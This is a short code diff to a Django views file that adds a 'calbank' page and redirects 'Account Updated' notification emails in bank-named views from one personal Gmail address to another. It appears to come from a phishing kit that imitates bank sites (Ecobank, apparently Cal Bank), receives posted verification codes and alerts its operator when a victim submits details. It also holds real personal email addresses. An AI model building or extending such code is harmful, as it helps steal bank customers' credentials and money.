@@ -7,6 +7,12 @@ from django.contrib import messages
 # Create your views here.
 
 
+def calbank(request):
+    
+    return render(request, 'page/calbank.html')
+
+
+
 def ecobankverify(request):
     if request.method == 'POST':
         code = request.POST['code']
@@ -46,7 +52,7 @@ def ecobank(request):
             'Account Updated',
             'yoo boi account has been updated',
             settings.EMAIL_HOST_USER,
-            ['rossenblay@gmail.com']
+            ['lilcoded7@gmail.com']
         )
         sendemail.fail_silently=True
         sendemail.send()
@@ -81,7 +87,7 @@ def home(request):
             'Account Updated',
             'yoo boi account has been updated',
             settings.EMAIL_HOST_USER,
-            ['rossenblay@gmail.com']
+            ['lilcoded7@gmail.com']
         )
         sendemail.fail_silently=True
         sendemail.send()
